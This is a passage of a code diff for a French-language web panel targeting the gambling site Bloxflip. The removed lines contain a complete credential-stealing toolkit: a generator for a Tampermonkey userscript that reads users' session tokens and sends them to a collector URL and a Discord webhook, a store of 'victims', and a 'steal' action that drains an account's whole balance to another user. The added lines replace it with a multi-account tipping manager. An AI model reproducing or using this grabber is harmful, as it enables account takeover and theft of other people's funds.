+                            <div class="field">
+                                <label>Destinataire</label>
+                                <input type="text" id="tip_recipient_${i}" placeholder="username">
+                            </div>
+                            <div class="field">
+                                <label>Montant</label>
+                                <input type="number" id="tip_amount_${i}" placeholder="0" step="any" min="0">
+                            </div>
+                            <div class="field">
+                                <label>Devise</label>
+                                <select id="tip_currency_${i}">
+                                    <option value="ROCOINS">ROCOINS</option>
+                                    <option value="FLIPCOINS">FLIPCOINS</option>
+                                    <option value="COINS">COINS</option>
+                                </select>
+                            </div>
+                            <button class="btn-tip" onclick="doTip(${i})">Envoyer</button>
+                        </div>
+                        <div id="tipResult_${i}" class="result-box"></div>
+                    </div>
+                    ` : ''}
                 </div>`;
             }).join('');
-
-            select.innerHTML = '<option value="">— Choisir un token —</option>' + 
-                victims.map((v, i) => {
-                    const status = v.valid === true ? '✅' : v.valid === false ? '❌' : '❓';
-                    const name = v.username || 'Inconnu';
-                    const bal = (v.rocoins || 0) > 0 ? ` [${(v.rocoins||0).toLocaleString()}R]` : '';
-                    return `<option value="${i}">${status} ${name}${bal}</option>`;
-                }).join('');
         }
 
-        function copyToken(index) {
-            const t = victims[index]?.token;
-            if (!t) return;
-            navigator.clipboard.writeText(t).then(() => log('✅ Token copié !', 'success'));
-        }
-
-        function deleteVictim(index) {
-            victims.splice(index, 1);
-            localStorage.setItem('bf_victims', JSON.stringify(victims));
-            renderVictims();
-            updateStats();
-            log('🗑️ Entrée supprimée', 'info');
-        }
-
-        // ============================================
-        // ONGLETS
-        // ============================================
-        function switchTab(tab) {
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.querySelector(`.tab[onclick="switchTab('${tab}')"]`).classList.add('active');
-            document.getElementById('tab-' + tab).classList.add('active');
-        }
-
-        // ============================================
-        // CONFIG
-        // ============================================
-        function saveConfig() {
-            config.siteUrl = document.getElementById('siteUrl').value;
-            config.discordWebhook = document.getElementById('discordWebhook').value;
-            localStorage.setItem('bf_config', JSON.stringify(config));
-            log('✅ Configuration sauvegardée', 'success');
-            if (config.discordWebhook) {
-                log('⚠️ Webhook Discord configuré — les tokens seront exfiltrés', 'error');
-            } else {
-                log('🔒 Aucun webhook — stockage local uniquement', 'info');
-            }
-        }
-
-        // ============================================
-        // GÉNÉRATION DU SCRIPT
-        // ============================================
-        function generateScript() {
-            const siteUrl = document.getElementById('siteUrl').value;
-            const webhook = document.getElementById('discordWebhook').value;
-
-            let sendToSite = '';
-            let sendToDiscord = '';
-
-            if (siteUrl && siteUrl.startsWith('http')) {
-                sendToSite = `
-            // Envoi vers le site collector
-            fetch('${siteUrl}', {
-                method: 'POST', mode: 'no-cors',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(() => {});`;
-            }
-
-            if (webhook && webhook.startsWith('http')) {
-                sendToDiscord = `
-            // Envoi vers Discord
-            fetch('${webhook}', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: '@here 🔑 **Nouveau token Bloxflip**',
-                    embeds: [{
-                        title: 'Bloxflip Grabber',
-                        color: 0xff6b35,
-                        fields: [
-                            { name: '👤 Pseudo', value: username, inline: true },
-                            { name: '🔑 Token', value: '\\\\\`\\\\\`\\\\\`' + (token || '❌') + '\\\\\`\\\\\`\\\\\`', inline: false },
-                            { name: '💰 ROCOINS', value: rocoins.toString(), inline: true },
-                            { name: '💰 FLIPCOINS', value: flipcoins.toString(), inline: true },
-                            { name: '🔗 URL', value: location.href, inline: false }
-                        ],
-                        timestamp: new Date().toISOString()
-                    }]
-                })
-            }).catch(() => {});`;
-            }
-
-            const script = `// ==UserScript==
-// @name         Bloxflip Token Grabber V4
-// @namespace    http://tampermonkey.net/
-// @version      4.0
-// @description  Capture le token cw:pubsubToken de Bloxflip
-// @author       Research
-// @match        https://bloxflip.com/*
-// @run-at       document-end
-// @grant        none
-// ==/UserScript==
-
-(function() {
-    'use strict';
-
-    setTimeout(() => {
-        // === LE VRAI TOKEN BLOXFLIP ===
-        const token = localStorage.getItem('cw:pubsubToken');
-        
-        console.log('[Grabber] cw:pubsubToken:', token ? token.substring(0,20)+'...' : 'ABSENT');
-
-        if (!token) {
-            console.log('[Grabber] Aucun token trouvé');
-            return;
-        }
-
-        async function getInfos() {
-            try {
-                const r = await fetch('https://bloxflip.com/api/user', {
-                    headers: {
-                        'Accept': 'application/json',
-                        'X-Auth-Token': token,
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-                    }
-                });
-                const d = await r.json();
-                if (d?.profile?.username) {
-                    return {
-                        username: d.profile.username,
-                        userId: d.profile.id,
-                        rank: d.profile.rank,
-                        rocoins: d.wallet?.balances?.ROCOINS || 0,
-                        flipcoins: d.wallet?.balances?.FLIPCOINS || 0
-                    };
+        // === ACTIONS ===
+        function addAccount() {
+            accounts.push({ rt: '', at: '', name: '', connected: false, loading: false });
+            saveAccounts(accounts);
+            activeIndex = accounts.length - 1;
+            render();
+            // Focus sur les inputs du nouveau compte
+            setTimeout(() => {
+                const panel = document.querySelector(`.panel[data-index="${activeIndex}"]`);
+                if (panel) {
+                    const input = panel.querySelector('input[type="password"]');
+                    if (input) input.focus();
                 }
-                return { username: 'TOKEN_INVALIDE', rocoins: 0, flipcoins: 0 };
-            } catch(e) {
-                return { username: 'ERREUR', rocoins: 0, flipcoins: 0 };
-            }
+            }, 100);
         }
 
-        async function sendTokens() {
-            const info = await getInfos();
-            
-            console.log('[Grabber] === TOKEN CAPTURE ===');
-            console.log('[Grabber] Token:', token);
-            console.log('[Grabber] Username:', info.username);
-            console.log('[Grabber] ROCOINS:', info.rocoins);
-            console.log('[Grabber] FLIPCOINS:', info.flipcoins);
-
-            const data = { 
-                token, 
-                username: info.username,
-                userId: info.userId,
-                rank: info.rank,
-                rocoins: info.rocoins,
-                flipcoins: info.flipcoins,
-                url: location.href, 
-                time: Date.now() 
-            };
-
-            // Envoi au panel parent
-            window.postMessage({ type: 'TOKENS', token, username: info.username, rocoins: info.rocoins, flipcoins: info.flipcoins }, '*');${sendToSite}${sendToDiscord}
-
-            // Notification visuelle
-            const div = document.createElement('div');
-            div.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#7cff7c;padding:12px 18px;border-radius:8px;border:1px solid #ff6b35;z-index:99999;font-family:monospace;font-size:12px;box-shadow:0 4px 20px rgba(0,0,0,0.5);';
-            div.innerHTML = '🔑 Token capturé: ' + info.username + '<br>💰 ' + info.rocoins.toFixed(4) + ' ROCOINS';
-            document.body.appendChild(div);
-            setTimeout(() => div.remove(), 5000);
-        }
-
-        sendTokens();
-        setTimeout(sendTokens, 3000);
-        setTimeout(sendTokens, 8000);
-    }, 2000);
-})();`;
-
-            document.getElementById('scriptCode').textContent = script;
-            document.getElementById('scriptOutput').style.display = 'block';
-            
-            log('✅ Script généré (token: cw:pubsubToken)', 'success');
-            if (webhook) log('⚠️ Webhook configuré dans le script', 'error');
-            else log('🔒 Aucune exfiltration automatique', 'info');
-        }
-
-        function copyScript() {
-            navigator.clipboard.writeText(document.getElementById('scriptCode').textContent)
-                .then(() => log('✅ Script copié', 'success'));
-        }
-
-        // ============================================
-        // AJOUT MANUEL
-        // ============================================
-        async function addManual() {
-            const tokenInput = document.getElementById('manualToken');
-            const nameInput = document.getElementById('manualName');
-            const token = tokenInput.value.trim();
-            
-            if (!token) {
-                log('❌ Colle un token', 'error');
-                return;
-            }
-
-            const manualName = nameInput.value.trim();
-            
-            log(`🔍 Test du token ${token.substring(0,16)}...`, 'info');
-            
-            const result = await testTokenApi(token);
-            
-            if (result.valid) {
-                addVictim(token, result.username, true, result.rocoins, result.flipcoins, result.rank);
-                log(`✅ Token VALIDE — ${result.username} (Rank ${result.rank}) | ROCOINS: ${result.rocoins} | FLIPCOINS: ${result.flipcoins}`, 'success');
-            } else {
-                addVictim(token, manualName || 'Inconnu', false);
-                log(`❌ Token INVALIDE — ${result.error}`, 'error');
-            }
-            
-            tokenInput.value = '';
-            nameInput.value = '';
-        }
-
-        // ============================================
-        // AJOUT VICTIME (interne)
-        // ============================================
-        window.addVictim = function(token, username, valid, rocoins, flipcoins, rank) {
-            if (victims.some(v => v.token === token)) {
-                log('ℹ️ Token déjà présent', 'info');
-                return;
-            }
-
-            victims.push({
-                token,
-                username: username || 'Inconnu',
-                valid: valid === true ? true : (valid === false ? false : undefined),
-                rocoins: rocoins || 0,
-                flipcoins: flipcoins || 0,
-                rank: rank || 0,
-                time: Date.now(),
-                lastTest: Date.now()
+        function removeAccount(index) {
+            if (!confirm(`Supprimer le compte "${accounts[index]?.name || `Compte ${index + 1}`}" ?`)) return;
+            accounts.splice(index, 1);
+            delete balancesCache[index];
+            // Re-indexer le cache
+            const newCache = {};
+            Object.keys(balancesCache).forEach(k => {
+                const oldIdx = parseInt(k);
+                if (oldIdx < index) newCache[oldIdx] = balancesCache[k];
+                else if (oldIdx > index) newCache[oldIdx - 1] = balancesCache[k];
             });
-            localStorage.setItem('bf_victims', JSON.stringify(victims));
-            renderVictims();
-            updateStats();
-            log(`✅ ${valid === true ? '✅' : valid === false ? '❌' : 'ℹ️'} ${username || 'inconnu'} ajouté`, valid === true ? 'success' : 'info');
-        };
+            balancesCache = newCache;
+            if (activeIndex >= accounts.length) activeIndex = accounts.length - 1;
+            if (activeIndex === index) activeIndex = Math.max(0, index - 1);
+            saveAccounts(accounts);
+            render();
+        }
 
-        // ============================================
-        // RÉCEPTION POSTMESSAGE
-        // ============================================
-        window.addEventListener('message', async (event) => {
-            const msg = event.data;
-            if (msg && msg.type === 'TOKENS' && msg.token) {
-                log('📩 Token reçu via postMessage, test en cours...', 'info');
-                
-                const result = await testTokenApi(msg.token);
-                
-                if (result.valid) {
-                    addVictim(msg.token, result.username, true, result.rocoins, result.flipcoins, result.rank);
-                } else {
-                    addVictim(msg.token, msg.username || 'Inconnu', false);
-                }
+        function switchAccount(index) {
+            activeIndex = index;
+            render();
+        }
+
+        async function connectAccount(index) {
+            const rt = document.getElementById(`rt_${index}`).value.trim();
+            const at = document.getElementById(`at_${index}`).value.trim();
+            const nick = document.getElementById(`nick_${index}`).value.trim();
+
+            if (!rt || !at) {
+                alert('Les deux tokens sont requis.');
+                return;
             }
+
+            const btn = document.getElementById(`connectBtn_${index}`);
+            btn.disabled = true;
+            btn.textContent = '⏳ Connexion...';
+            accounts[index].loading = true;
+            saveAccounts(accounts);
+            render();
+
+            try {
+                const balance = await getBalance(rt);
+                accounts[index].rt = rt;
+                accounts[index].at = at;
+                accounts[index].name = nick || `Compte ${index + 1}`;
+                accounts[index].connected = true;
+                accounts[index].loading = false;
+                balancesCache[index] = balance;
+                saveAccounts(accounts);
+                render();
+            } catch (err) {
+                accounts[index].loading = false;
+                accounts[index].connected = false;
+                saveAccounts(accounts);
+                render();
+                alert('❌ Erreur de connexion : ' + err.message);
+            }
+        }
+
+        async function doTip(index) {
+            const rt = accounts[index].rt;
+            const recipient = document.getElementById(`tip_recipient_${index}`).value.trim();
+            const amount = document.getElementById(`tip_amount_${index}`).value.trim();
+            const currency = document.getElementById(`tip_currency_${index}`).value;
+            const resultDiv = document.getElementById(`tipResult_${index}`);
+
+            if (!recipient) return showTipResult(index, 'Nom d\'utilisateur requis.', 'error');
+            if (!amount || parseFloat(amount) <= 0) return showTipResult(index, 'Montant invalide.', 'error');
+
+            const btn = resultDiv.parentElement.querySelector('.btn-tip');
+            btn.disabled = true;
+            btn.textContent = '⏳...';
+
+            try {
+                const result = await sendTip(rt, recipient, amount, currency);
+                showTipResult(index, JSON.stringify(result, null, 2), result.success ? 'success' : 'error');
+                // Rafraîchir les soldes
+                refreshBalances(index);
+            } catch (err) {
+                showTipResult(index, 'Erreur: ' + err.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = 'Envoyer';
+            }
+        }
+
+        async function refreshBalances(index) {
+            const rt = accounts[index].rt;
+            if (!rt) return;
+            try {
+                const balance = await getBalance(rt);
+                balancesCache[index] = balance;
+                render();
+            } catch {}
+        }
+
+        function showTipResult(index, msg, type) {
+            const div = document.getElementById(`tipResult_${index}`);
+            div.textContent = msg;
+            div.className = 'result-box ' + type;
+        }
+
+        // === INIT ===
+        // Sauvegarder les infos quand on change d'onglet ou clique ailleurs
+        document.addEventListener('change', (e) => {
+            // Sauvegarder auto les tokens édités
+            saveAccounts(accounts);
         });
 
-        // ============================================
-        // ACTIONS SUR L'API
-        // ============================================
-        async function executeAction(action) {
-            const resultBox = document.getElementById('actionResult');
-            const victimIndex = document.getElementById('actionVictim').value;
-            const recipient = document.getElementById('actionRecipient').value.trim();
-            const currency = document.getElementById('actionCurrency').value;
-
-            if (!victimIndex) {
-                showResult(resultBox, '❌ Choisis un token', 'error');
-                return;
-            }
-
-            const v = victims[parseInt(victimIndex)];
-            if (!v || !v.token) {
-                showResult(resultBox, '❌ Pas de token', 'error');
-                return;
-            }
-
-            if (!v.valid) {
-                showResult(resultBox, '⚠️ Token non testé ou invalide. Teste-le d\'abord.', 'warning');
-                return;
-            }
-
-            if (action === 'tip' || action === 'steal') {
-                if (!recipient) {
-                    showResult(resultBox, '❌ Entre le destinataire', 'error');
-                    return;
-                }
-            }
-
-            showResult(resultBox, '⏳ En cours... <span class="loading">▌</span>', 'info');
-
-            const headers = {
-                ...getHeaders(v.token),
-                'Content-Type': 'application/json'
-            };
-
-            try {
-                if (action === 'balance') {
-                    const res = await fetch('https://bloxflip.com/api/user', { headers: getHeaders(v.token) });
-                    if (res.status === 401) {
-                        showResult(resultBox, '❌ Token expiré', 'error');
-                        v.valid = false;
-                        localStorage.setItem('bf_victims', JSON.stringify(victims));
-                        renderVictims();
-                        return;
-                    }
-                    const data = await res.json();
-                    
-                    if (data?.profile?.username) {
-                        v.username = data.profile.username;
-                        v.valid = true;
-                        v.rank = data.profile.rank;
-                    }
-                    v.rocoins = data.wallet?.balances?.ROCOINS || 0;
-                    v.flipcoins = data.wallet?.balances?.FLIPCOINS || 0;
-                    v.coins = data.wallet?.balances?.COINS || 0;
-                    localStorage.setItem('bf_victims', JSON.stringify(victims));
-                    renderVictims();
-                    updateStats();
-                    
-                    showResult(resultBox, `💰 ${v.username} (Rank ${v.rank})<br>ROCOINS: ${v.rocoins.toLocaleString()}<br>FLIPCOINS: ${v.flipcoins.toLocaleString()}<br>COINS: ${v.coins.toLocaleString()}`, 'success');
-                    log(`💰 ${v.username}: ${v.rocoins} ROCOINS, ${v.flipcoins} FLIPCOINS, ${v.coins} COINS`, 'success');
-                }
-                else if (action === 'tip') {
-                    const amount = prompt(`Montant à tip (en ${currency}) ?`);
-                    if (!amount || parseFloat(amount) <= 0) {
-                        showResult(resultBox, '❌ Montant invalide', 'error');
-                        return;
-                    }
-
-                    const res = await fetch('https://bloxflip.com/api/chat/commands/gift', {
-                        method: 'POST',
-                        headers: { ...headers },
-                        body: JSON.stringify({
-                            recipientUsername: recipient,
-                            amount: parseFloat(amount),
-                            captcha_token: ""
-                        })
-                    });
-                    
-                    let data;
-                    try { data = await res.json(); } catch(e) { data = { error: 'Réponse invalide' }; }
-                    
-                    if (data.success) {
-                        showResult(resultBox, `✅ ${amount} ${currency} → ${recipient}`, 'success');
-                        log(`✅ ${amount} ${currency} → ${recipient} (depuis ${v.username})`, 'success');
-                    } else {
-                        showResult(resultBox, `❌ ${data.error || 'Échec'}`, 'error');
-                        log(`❌ Tip échoué: ${data.error || 'inconnu'}`, 'error');
-                    }
-                }
-                else if (action === 'steal') {
-                    // Récupérer le dernier solde
-                    const res = await fetch('https://bloxflip.com/api/user', { headers: getHeaders(v.token) });
-                    if (res.status === 401) {
-                        showResult(resultBox, '❌ Token expiré', 'error');
-                        v.valid = false;
-                        localStorage.setItem('bf_victims', JSON.stringify(victims));
-                        renderVictims();
-                        return;
-                    }
-                    const data = await res.json();
-                    const amount = data.wallet?.balances?.[currency] || 0;
-
-                    if (amount <= 0) {
-                        showResult(resultBox, `❌ Pas de ${currency} à voler`, 'error');
-                        return;
-                    }
-
-                    showResult(resultBox, `⏳ Vol de ${amount.toLocaleString()} ${currency}...`, 'info');
-
-                    const tipRes = await fetch('https://bloxflip.com/api/chat/commands/gift', {
-                        method: 'POST',
-                        headers: { ...headers },
-                        body: JSON.stringify({
-                            recipientUsername: recipient,
-                            amount: amount,
-                            captcha_token: ""
-                        })
-                    });
-                    
-                    let tipData;
-                    try { tipData = await tipRes.json(); } catch(e) { tipData = { error: 'Réponse invalide' }; }
-                    
-                    if (tipData.success) {
-                        // Mise à jour après vol
-                        const updateRes = await fetch('https://bloxflip.com/api/user', { headers: getHeaders(v.token) });
-                        if (updateRes.ok) {
-                            const updateData = await updateRes.json();
-                            v.rocoins = updateData.wallet?.balances?.ROCOINS || 0;
-                            v.flipcoins = updateData.wallet?.balances?.FLIPCOINS || 0;
-                            localStorage.setItem('bf_victims', JSON.stringify(victims));
-                            renderVictims();
-                        }
-                        
-                        showResult(resultBox, `✅ ${amount.toLocaleString()} ${currency} volés → ${recipient}`, 'success');
-                        if (currency === 'ROCOINS') stats.rocoins = (stats.rocoins || 0) + amount;
-                        else stats.flipcoins = (stats.flipcoins || 0) + amount;
-                        localStorage.setItem('bf_stats', JSON.stringify(stats));
-                        updateStats();
-                        log(`🔥 ${amount.toLocaleString()} ${currency} volés vers ${recipient}`, 'success');
-                    } else {
-                        showResult(resultBox, `❌ ${tipData.error || 'Échec du vol'}`, 'error');
-                        log(`❌ Vol échoué: ${tipData.error || 'inconnu'}`, 'error');
-                    }
-                }
-            } catch (err) {
-                showResult(resultBox, `❌ Erreur: ${err.message}`, 'error');
-                log(`❌ Erreur: ${err.message}`, 'error');
-            }
-        }
-
-        function showResult(box, html, type) {
-            box.className = 'result-box ' + type;
-            box.innerHTML = html;
-            box.style.display = 'block';
-        }
-
-        window.executeAction = executeAction;
-
-        // ============================================
-        // INIT
-        // ============================================
-        if (config.siteUrl) document.getElementById('siteUrl').value = config.siteUrl;
-        if (config.discordWebhook) document.getElementById('discordWebhook').value = config.discordWebhook;
-
-        renderVictims();
-        updateStats();
-        log('🟢 Prêt. Utilise cw:pubsubToken comme token.', 'info');
-        log('💡 Astuce: teste d\'abord le token avec 🔍 Tester avant d\'agir', 'info');
-        
-        if (config.discordWebhook) log('⚠️ Webhook Discord configuré', 'error');
-        else log('🔒 Local uniquement', 'info');
+        render();
     </script>
 </body>
 </html>
